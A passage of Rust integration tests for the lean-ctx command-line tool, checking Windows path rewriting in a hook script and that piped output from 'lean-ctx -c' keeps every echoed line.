        .stderr(Stdio::piped())
        .spawn()
        .expect("failed to spawn bash");

    child
        .stdin
        .take()
        .unwrap()
        .write_all(input.as_bytes())
        .unwrap();

    let output = child.wait_with_output().expect("failed to wait");
    let _ = std::fs::remove_file(&script_path);
    let stdout = String::from_utf8_lossy(&output.stdout);

    if !stdout.trim().is_empty() {
        let v: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|e| {
            panic!("invalid JSON from Windows path script: {e}\nraw: {stdout}")
        });
        let cmd = v["hookSpecificOutput"]["updatedInput"]["command"]
            .as_str()
            .expect("should have command");
        assert!(
            cmd.contains("/c/Users/Jaina/bin/lean-ctx.exe"),
            "rewritten command should use the Windows bash path: {cmd}"
        );
        assert!(
            cmd.contains("git status"),
            "original command should be preserved: {cmd}"
        );
    }
}

#[test]
fn piped_output_is_not_compressed() {
    if cfg!(windows) {
        return;
    }
    let bin = lean_ctx_bin();
    let script = r#"echo "line one"; echo "line two"; echo "line three""#.to_string();
    let output = Command::new(&bin)
        .args(["-c", &script])
        .env("LEAN_CTX_DISABLED", "0")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .expect("run");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("line one"),
        "piped output must contain original content: {stdout}"
    );
}

#[test]
fn bash_hook_contains_pipe_guard() {
    if cfg!(windows) {
        return;
    }
    let bin = lean_ctx_bin();
    let _output = Command::new(&bin)
        .args(["init", "--dry-run"])
        .env("LEAN_CTX_DISABLED", "1")
        .env("SHELL", "/bin/bash")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .expect("run init --dry-run");
    // This is tested more directly in cli.rs unit tests
}

#[test]
fn generated_bash_hook_has_tty_check() {
    let script = lean_ctx::hooks::generate_rewrite_script("lean-ctx");
    // The rewrite hook is for Claude Code / Gemini, not the shell alias.
    // The shell alias pipe guard is in cli.rs.
    assert!(
        !script.is_empty(),
        "generated rewrite script should not be empty"
    );
}

#[test]
fn lean_ctx_c_preserves_output_when_piped() {
    if cfg!(windows) {
        return;
    }
    let bin = lean_ctx_bin();

    let output = Command::new(&bin)
        .args(["-c", "echo MARKER_STRING_12345"])
        .env_remove("LEAN_CTX_DISABLED")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .expect("run lean-ctx -c echo");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("MARKER_STRING_12345"),
        "lean-ctx -c must preserve output content when piped: {stdout}"
    );
}

#[test]
fn lean_ctx_c_multiline_preserves_all_lines_when_piped() {
    if cfg!(windows) {
        return;
    }
    let bin = lean_ctx_bin();
    let cmd = "echo LINE_A && echo LINE_B && echo LINE_C";
    let output = Command::new(&bin)
        .args(["-c", cmd])
        .env_remove("LEAN_CTX_DISABLED")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .expect("run");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("LINE_A"), "LINE_A: {stdout}");
    assert!(stdout.contains("LINE_B"), "LINE_B: {stdout}");
    assert!(stdout.contains("LINE_C"), "LINE_C: {stdout}");
}
